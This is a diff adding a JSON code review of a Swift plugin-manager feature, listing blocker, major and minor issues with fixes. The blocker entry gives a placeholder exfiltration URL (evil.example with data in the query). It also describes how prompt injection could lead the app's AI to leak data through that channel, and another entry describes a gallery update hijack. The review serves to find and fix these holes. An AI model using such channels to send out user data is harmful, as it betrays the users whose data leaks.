@@ -1,0 +1,89 @@
+{
+  "verdict": "needs-fix",
+  "issues": [
+    {
+      "severity": "blocker",
+      "where": "NibKit/Sources/FeatPluginManager/FeatPluginManagerFeature.swift:136-170 (gallery.list `index` param)",
+      "problem": "gallery.list fetches any caller-supplied HTTPS URL. The command is effect .read / target .app, not sensitive, and exposed to every principal. So a plugin holding only the 'app' scope (the New Plugin skeleton requests exactly that) can call gallery.list {index: \"https://evil.example/x?d=<data>\"} and the app performs the GET, bypassing the contracts-v2 G6 rule that non-user downloads need the 'network' scope and a host in manifest network.hosts. The AI can do the same with no confirmation, which makes it an exfiltration channel driven by prompt injection.",
+      "fix": "In the handler, when !ctx.principal.isUser and p[\"index\"] is set, refuse with permission_denied unless the index is GalleryClient.defaultIndex or listed in NibSettings.pluginGalleries. Alternatively, fetch non-user indexes through ctx.inputFile(index), which enforces G6 and the size cap, and read the file only if it is at most 2 MB. Add tests: .plugin(id) with an unlisted index gets permission_denied; a configured index still works."
+    },
+    {
+      "severity": "major",
+      "where": "NibKit/Sources/FeatPluginManager/PluginListView.swift:238-244 (permission toggles bound to current.granted)",
+      "problem": "Each permission toggle reflects plugin.list `granted`, which is NibPluginHost's runtime-effective set (authority.scopes needs the plugin loaded). For a disabled or failed plugin, every consented permission shows as off. The user cannot revoke a scope before re-enabling: switching it 'off' is a no-op because it already looks off. Enabling the plugin then runs it with every permission it was previously granted. Turning a toggle 'on' asks again for a scope that is already granted. The UI misstates what the plugin is trusted with.",
+      "fix": "Bind the toggles to the persisted consent: ManagerGrants.read()[id].scopes when its sha256 equals plugin.sha256. A small read command (pluginmanager.inspect could return `consented`) keeps this reachable for AI and plugins. Show runtime availability separately, for example 'Not running'. Add a test with a disabled plugin whose grant holds a scope: the toggle is on and revoking it rewrites the grant."
+    },
+    {
+      "severity": "major",
+      "where": "NibKit/Sources/FeatPluginManager/PluginListView.swift:87-95 (update(for:)); GalleryView.swift:101-105,147-149",
+      "problem": "Updates match on plugin id alone, across every configured gallery. Any gallery the user adds can list an installed id (dev.popular.plugin) at a higher version. That produces the 'Update' capsule and a primary 'Review Update to X' button that installs a different publisher's package over the installed one. The installer's consent does not flag a change of source, so this is a hijack path at a trust boundary.",
+      "fix": "Offer an update only from entries whose source matches InstalledPlugin.source (the installer records 'gallery:<base>' / 'url:<url>'): same base, or same URL host and directory. Present other publishers' entries with the same id as a distinct 'Replace with version from <gallery>' action with a warning. Add unit tests for update(for:) covering same-source, other-source and prerelease cases."
+    },
+    {
+      "severity": "major",
+      "where": "NibKit/Sources/FeatPluginManager/FeatPluginManagerFeature.swift:178-195; PluginListView.swift:42-69,161-164; GalleryView.swift:71-78",
+      "problem": "Paging work grows quadratically and runs on the main actor. Every gallery.list page iterates every entry of every index and, for each one, computes a SHA256 saved key, does a settings lookup and runs a full JSONEncoder encode, including entries before `offset`. PluginManagerModel.loadGallery then pulls every page: 20 indexes x 2,000 entries is about 1,300 pages x 40,000 encodes on the main actor. The Plugins sheet does this on every open (refresh) and the Gallery tab on every search keystroke (no debounce). A save toggle triggers it again. The UI freezes on large galleries.",
+      "fix": "Only compute `saved` and the size for entries in [offset, page end); stop iterating once the page is full and count the remaining matches without encoding. Cache the filtered, saved-annotated list in GalleryClient keyed by (indexes, filters, settings generation), so later pages are slices. Debounce the search field (about 300 ms) before .task(id:). For update detection, add an `ids` filter to gallery.list instead of paging the whole gallery."
+    },
+    {
+      "severity": "major",
+      "where": "NibKit/Sources/FeatPluginManager/GalleryClient.swift:47-59 (GalleryHTTP.fetch)",
+      "problem": "The 2 MB cap is checked only after URLSession.data(for:) has buffered the whole response in memory, so the limit does not protect anything. A misbehaving or hostile gallery (up to 20 fetched concurrently) can return hundreds of MB and get the app killed by jetsam whenever the Gallery tab or Plugins sheet opens.",
+      "fix": "Reject early when response.expectedContentLength > maxBytes. Read with session.bytes(for:) and cancel once the accumulated count passes maxBytes, or download to disk and check the file size before loading it. Test with a fetcher stub that streams more than 2 MB."
+    },
+    {
+      "severity": "major",
+      "where": "NibKit/Sources/FeatPluginManager/PluginListView.swift:361-370 (ManagerError), used at PluginListView.swift:130, GalleryView.swift:38,48, DevConsoleView.swift:28",
+      "problem": "ManagerError is a hand-built inline error row (destructive-tinted Text plus a plain retry button). NibDesign v2 added NibBanner(message, style:, symbol:, action:) for exactly this, and DESIGN_SYSTEM.md 'NibDesign v2 additions' §4 lists F080 as a consumer. Under the review rules, a workaround that v2 now covers counts as a major.",
+      "fix": "Replace ManagerError with NibBanner(message, style: .warning, action: NibAction(String(localized: \"Try Again\")) { retry() }) and delete the custom view."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatPluginManager/FeatPluginManagerFeature.swift:89-97 (PluginSkeleton.validID / files)",
+      "problem": "validID accepts ids up to 160 characters, but the host and installer accept at most 128. The skeleton never checks the host rule that `<id>.hello`, with dots written as __, must fit 64 characters. NewPluginSheet therefore enables 'Review and Create' for ids whose plugin installs but then fails to load. Gallery parsing also lists entries that cannot be installed.",
+      "fix": "Use count <= 128 and, in PluginSkeleton.files, require (id + \".hello\").replacingOccurrences(of: \".\", with: \"__\").count <= 64 with a clear error. Mirror the same check in NewPluginSheet.isPrimaryEnabled. Add a test that decodes the skeleton manifest as PluginManifest and checks these limits."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatPluginManager/GalleryClient.swift:115-186 (parse)",
+      "problem": "One malformed entry fails the whole index: an unknown kind, a bad version, an unsafe file or an oversize entry. A publisher that adds a new kind with minApi 1 breaks the gallery for every existing client, and one bad listing hides all the good ones.",
+      "fix": "Skip invalid entries (collect their paths and messages), return the valid ones, and surface 'N items could not be read' in GalleryIndex.error or a new `skipped` field. Keep root-level validation fatal."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatPluginManager/GalleryView.swift:98-110,152-163",
+      "problem": "The row's @State `saved` overrides entry.saved permanently. Rows are keyed by entry.key, so the state survives reloads. When the saved setting changes elsewhere (AI or settings.set, sync from another device), the bookmark icon and the next toggle use the stale value.",
+      "fix": "Drop the @State override and use entry.saved, which is reloaded via the savedPrefix didChange observer. Or reset `saved = nil` in .onChange(of: entry.saved)."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatPluginManager/DevConsoleView.swift:99-102",
+      "problem": ".accessibilityLabel(\"Plugin logs\") on the log text and the code block replaces the content, so VoiceOver reads only 'Plugin logs' and never the log lines.",
+      "fix": "Keep the label but add .accessibilityValue(lines.joined(separator: \"\\n\")), or drop the override so the text is read."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatPluginManager/FeatPluginManagerFeature.swift:289-291",
+      "problem": "The re-consent title is built as 'Allow \\(PermissionCopy.sentence(scope)) for \\(plugin.name)?'. It reads 'Allow Read every document for Cards?'. For network it reads 'Allow Reach the network:  for Cards?' with no hosts, so the user consents to network access without seeing which hosts.",
+      "fix": "Pass the manifest hosts (handle?.manifest.network?.hosts, or plugin.list networkHosts) and phrase it as 'Allow \\(name) to \\(sentence lowercased)?' with the host list."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatPluginManager/PluginListView.swift:154",
+      "problem": "Every .nibRegistryDidChange from any registry in the app starts plugin.list, which rescans the plugins folder. There is no owner filter and no coalescing. Loading one plugin posts dozens of registrations, so opening the manager while plugins load sets off a burst of rescans.",
+      "fix": "Filter on RegistryChange.ownerKey matching an installed plugin id (or the command registry), and debounce, for example .debounce(for: .milliseconds(250)) on the publisher."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatPluginManager/PluginListView.swift:111-129; DevConsoleView.swift:36-38",
+      "problem": "The manager sheet is registered with providesHeader: true but draws no title in regular width; only the compact NavigationStack sets one. The console's code input is a raw TextEditor with a hand-applied fill and radius instead of a NibDesign field.",
+      "fix": "Lead the sheet with NibSheetHeader or NibPanelHeader titled 'Plugins', with Install from… and Close as its actions. Use NibField(text:prompt:lines:) with NibFont.code for the JavaScript input. Truncate very large evaluate results, for example to 64 KB, before NibCodeBlock."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Tests/FeatPluginManagerTests/FeatPluginManagerTests.swift",
+      "problem": "The tests miss the riskiest logic: no test that non-user principals cannot use an arbitrary gallery.list index; no tests for update(for:) source and version matching; nothing showing the New Plugin skeleton decodes as a valid PluginManifest within the host's id and tool-name limits; no test of the permission toggle state for disabled plugins.",
+      "fix": "Add those four tests alongside the fixes above."
+    }
+  ]
+}
